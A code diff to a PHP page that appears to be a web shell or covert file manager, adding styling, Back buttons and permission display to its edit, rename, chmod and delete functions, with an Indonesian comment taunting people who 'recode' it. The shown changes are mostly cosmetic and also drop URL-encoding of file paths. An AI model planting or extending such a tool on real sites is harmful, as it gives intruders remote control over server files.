@@ -1,3 +1,6 @@
+<?php
+// recode ? mikir anjing w cape2 bikin lah elu tinggal recode
+?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -143,7 +146,8 @@ a {
 }
 input:focus,
 textarea:focus,
-select:focus {
+select:focus,
+a.back {
   border:1px solid red;
 }
 th.line {
@@ -154,9 +158,24 @@ th.line {
   height:25px;
   margin-bottom:-6px;
 }
+a.back,
 select:hover, 
 input[type=submit]:hover {
     cursor:pointer;
+}
+table.back {
+  background:none;
+  border:none;
+}
+a.back {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  color:#fff;
+  border-radius:3px;
+  border:1px solid #383838;
+  background:#383838;
+  padding:5px 30px;
+  outline:none;
+  width:100%;
 }
 </style>
 <body>
@@ -461,7 +480,7 @@ function edit($post, $filename) {
     ?>
     <thead>
       <tr>
-        <th><a style="color:#fff;" href="?path=<?php print @cwd() ?>">EDIT</a></th>
+        <th>EDIT</th>
       </tr>
       <tr>
         <th>Filename : <?php print @permission($filename, @basename($filename)) ?></th>
@@ -470,13 +489,22 @@ function edit($post, $filename) {
     <form method="post">
       <tr>
         <td>
-          <textarea name="text" placeholder="Nothing Value"><?php print $text ?></textarea>
+          <textarea name="text"><?php print $text ?></textarea>
         </td>
       </tr>
       <tr>
         <td>
           <input style="width:100%;" type="submit" name="submit" value="SAVE">
         </td>
+      </tr>
+      <table class="back">
+      <tr>
+        <td>
+          <center>
+          <a class="back" href="?path=<?php print @cwd() ?>">Back</a>
+        </center>
+        </td>
+      </tr>
       </tr>
     </form>
     <?php
@@ -507,7 +535,7 @@ function renames($post, $filename) {
     ?>
     <thead>
       <tr>
-        <th><a style="color:#fff;" href="?path=<?php print @cwd() ?>">RENAME</a></th>
+        <th>RENAME</th>
       </tr>
     </thead>
     <form method="post">
@@ -520,6 +548,14 @@ function renames($post, $filename) {
         <td>
           <input style="width:100%;" type="submit" name="submit" value="RENAME">
         </td>
+        <table class="back">
+      <tr>
+        <td>
+          <center>
+          <a class="back" href="?path=<?php print @cwd() ?>">Back</a>
+        </center>
+        </td>
+      </tr>
       </tr>
     </form>
     <?php
@@ -550,7 +586,7 @@ function chmods($post, $filename) {
     ?>
     <thead>
       <tr>
-        <th><a style="color:#fff;" href="?path=<?php print @cwd() ?>">CHANGE MODE</a></th>
+        <th>CHANGE MODE</th>
       </tr>
     </thead>
     <form method="post">
@@ -563,6 +599,14 @@ function chmods($post, $filename) {
         <td>
           <input style="width:100%;" type="submit" name="submit">
         </td>
+        <table class="back">
+      <tr>
+        <td>
+          <center>
+          <a class="back" href="?path=<?php print @cwd() ?>">Back</a>
+        </center>
+        </td>
+      </tr>
       </tr>
     </form>
     <?php
@@ -618,7 +662,7 @@ if ($_GET['do'] == 'delete')
       </th>
     </tr>
     <tr>
-      <th colspan="4"><?php print @pwd() ?></th>
+      <th colspan="4"><?php print @pwd() ?> ( <?php @permission(@cwd(), @perms(@cwd())) ?> )</th>
     </tr>
   </thead>
   <tbody>
@@ -644,9 +688,9 @@ foreach ($getPATH as $dir) {
       <center>
       <select onclick="if (this.value) window.location=(this.value)">
         <option value="" selected>Choose . .</option>
-        <option value="?path=<?php print @cwd() ?>&do=rename&file=<?php print @urlencode(@cwd().DIRECTORY_SEPARATOR.$dir) ?>">Rename</option>
-        <option value="?path=<?php print @cwd() ?>&do=delete&file=<?php print @urlencode(@cwd().DIRECTORY_SEPARATOR.$dir) ?>">Delete</option>
-        <option value="?path=<?php print @cwd() ?>&do=chmod&file=<?php print  @urlencode(@cwd().DIRECTORY_SEPARATOR.$dir) ?>">Chmod</option>
+        <option value="?path=<?php print @cwd() ?>&do=rename&file=<?php print @cwd().DIRECTORY_SEPARATOR.$dir ?>">Rename</option>
+        <option value="?path=<?php print @cwd() ?>&do=delete&file=<?php print @cwd().DIRECTORY_SEPARATOR.$dir ?>">Delete</option>
+        <option value="?path=<?php print @cwd() ?>&do=chmod&file=<?php print  @cwd().DIRECTORY_SEPARATOR.$dir ?>">Chmod</option>
       </select>
     </center>
     </td>
@@ -732,10 +776,10 @@ foreach ($getPATH as $file) {
       <center>
       <select onclick="if (this.value) window.location=(this.value)">
         <option value="" selected>Choose . .</option>
-        <option value="?path=<?php print @cwd() ?>&do=edit&file=<?php print @urlencode(@cwd().DIRECTORY_SEPARATOR.$file) ?>">Edit</option>
-        <option value="?path=<?php print @cwd() ?>&do=delete&file=<?php print @urlencode(@cwd().DIRECTORY_SEPARATOR.$file) ?>">Delete</option>
-        <option value="?path=<?php print @cwd() ?>&do=rename&file=<?php print @urlencode(@cwd().DIRECTORY_SEPARATOR.$file) ?>">Rename</option>
-        <option value="?path=<?php print @cwd() ?>&do=chmod&file=<?php print @urlencode(@cwd().DIRECTORY_SEPARATOR.$file) ?>">Chmod</option>
+        <option value="?path=<?php print @cwd() ?>&do=edit&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Edit</option>
+        <option value="?path=<?php print @cwd() ?>&do=delete&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Delete</option>
+        <option value="?path=<?php print @cwd() ?>&do=rename&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Rename</option>
+        <option value="?path=<?php print @cwd() ?>&do=chmod&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Chmod</option>
       </select>
     </center>
     </td>
